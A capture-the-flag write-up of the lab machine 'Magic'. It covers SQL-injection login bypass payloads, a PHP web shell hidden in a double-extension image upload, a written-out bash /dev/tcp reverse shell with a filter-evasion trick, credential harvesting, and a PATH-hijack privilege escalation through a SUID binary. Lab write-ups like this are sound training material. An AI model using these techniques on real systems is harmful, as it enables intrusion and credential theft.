---
description: Medium machine OSCP style
---

# Magic

## Reconnaissance

First we ensure that the machine is up by pinging it. Moreover, we can notice from the TTL that it is a Linux machine as the value is 63 (should be 64 but because of the intermediary node it is decreased).

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.04.26.png" alt=""><figcaption></figcaption></figure>

In a first scanning, using nmap to look for open ports the target machine does only have ports 22 and 80 opened.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.07.23.png" alt=""><figcaption></figcaption></figure>

Through a version scan, we look for further information about the services running on that ports.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.09.33.png" alt=""><figcaption></figcaption></figure>

With the tool `whatweb` we obtain more information about the technologies that the web server on port 80 is using.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.10.03.png" alt=""><figcaption></figcaption></figure>

This is the aspect of the web page. As we can see, images can be seen and in the down left corner we can see a login link and it says you must log to then upload images.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.13.23.png" alt=""><figcaption></figcaption></figure>

## Exploitation

As we do not have any credentials, we start making some attempts of SQL injection in order to log in without any valid credentials. After some time, we are able to log in using `' or 1=1#` or in this case `admin'#`.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.12.59 (1).png" alt=""><figcaption></figcaption></figure>

Then the upload panel is shown and we can upload any image with .jpg, .png or .jpeg extensions. To test this functionality we upload a test image and then ensure that it was uploaded successfully.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.13.05.png" alt=""><figcaption></figcaption></figure>

This is the uploaded image and as can be seen, it is shown in the main web page.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.16.22.png" alt=""><figcaption></figcaption></figure>

To exploit this functionality, we get the same image that was previously uploaded and add the .php extension so that the image has two extensions.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.18.30.png" alt=""><figcaption></figcaption></figure>

Then, we modify the content of the image to insert php code so that we may be able to execute code on the server. This code basically uses the parameter `cmd` to execute this with the function system.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.20.26.png" alt=""><figcaption></figcaption></figure>

After uploading it, we test it accessing to the image via the browser and executing the command `ls -l` to test if it works. As can be seen in the image, the command is executed and the result is shown.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 18.34.49.png" alt=""><figcaption></figcaption></figure>

Then we are using the parameter `cmd` to run the reverse shell. The command used is:

```
bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'
```

However there is some sanitization but changin the & for %26 it works.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.07.15.png" alt=""><figcaption></figcaption></figure>

With the listener configured and the request performed, the shell is received.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.07.31.png" alt=""><figcaption></figcaption></figure>

As the user `www-data` we start looking for interesting information and after some time, we notice that there is a file called `db.php5` in the directory of the web server. As we can see in the image, we can see some credentials of the user theseus.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.22.42.png" alt=""><figcaption></figcaption></figure>

With the `mysql` tool we are able to dump the database and as we can see in the second image, there are some other credentials shown.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.28.20.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.28.03.png" alt=""><figcaption></figcaption></figure>

At this point, we try to switch to the user `theseus` using this password and we got it. Now we get the flag.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.29.28.png" alt=""><figcaption></figcaption></figure>

## Privilege escalation

Now we are going to try to escalate privileges. Looking for suid privileges we notice that there is a a binary called `sysinfo` which is suspicious.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.32.00.png" alt=""><figcaption></figcaption></figure>

At this point we ensure that it has suid privileges so it could be used to escalate to gain adminitrative privileges.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.33.28.png" alt=""><figcaption></figcaption></figure>

By exectuing this binary, we notice that the result is information about the system as it can be seen in the image below.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-02 a las 19.33.14.png" alt=""><figcaption></figcaption></figure>

Using the tool `strings` we obtain the strings of the binary and we see that it is running certain commads to get the information about the disks, hardware or cpu. As we can see, the commands are execute using relative paths.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-03 a las 11.25.36.png" alt=""><figcaption></figcaption></figure>

With the tool `which` we see where the binary fdisk is stored.&#x20;

{% hint style="info" %}
As the commands are being run in a relative way, the attacker could modify the PATH value so the binary is taken from another directory under the attacker control which includes malicious binaries using the names of those that are being used by the program.
{% endhint %}

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-03 a las 11.26.46.png" alt=""><figcaption></figcaption></figure>

To exploit it, we are going to use the fdisk binary to create another binary under the `/tmp` folder with the same name but with a piece of code to provide the `/bin/bash` suid privileges. Then, we modify the PATH value to first look under the `/tmp` directory.&#x20;

As we can see, before running again the binary `/bin/sysinfo` the bash has no suid privileges.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-03 a las 11.37.58.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
We have to provide execution privileges to the binary to be executed.&#x20;
{% endhint %}

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-03 a las 11.36.45.png" alt=""><figcaption></figcaption></figure>

After running `sysinfo` again, the program calls to `fdisk` but now it is found in the `/tmp` directory so the binary is run and the privileges of `/bin/bash` are changed to suid.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-03 a las 11.38.57.png" alt=""><figcaption></figcaption></figure>

After this we can get the root flag and PWNED!

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-04-03 a las 11.39.28.png" alt=""><figcaption></figcaption></figure>
